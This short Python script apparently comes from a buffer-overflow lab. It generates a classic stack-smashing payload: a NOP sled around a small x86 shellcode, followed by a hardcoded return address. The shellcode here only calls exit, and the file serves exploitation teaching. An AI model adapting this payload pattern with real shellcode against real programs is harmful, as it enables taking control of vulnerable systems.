def generate_shellcode(nop_count):
    # NOP sled (x90 repeated nop_count times)
    nop_sled_first_half = "\\x90" * (nop_count // 2)
    nop_sled_second_half = "\\x90" * (nop_count // 2)

    # Shell code
    shell_code = "\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xb3\\x05\\xcd\\x80"

    # buffer address
    address = "\\x38\\xc8\\xff\\xff"
    # generate_payload.py
    # with open("payload.bin", "wb") as f:
    #     f.write(nop_sled_first_half + shell_code + nop_sled_second_half + address)  # NOP sled
        
    # Combine and return
    return nop_sled_first_half + shell_code + nop_sled_second_half + address

if __name__ == "__main__":
    try:
        user_input = int(input("Enter the number of NOPs (\\x90) to generate: "))
        shellcode = generate_shellcode(user_input)
        print(f'Generated Shellcode:\n"{shellcode}"')
        
    except ValueError:
        print("Please enter a valid integer.")
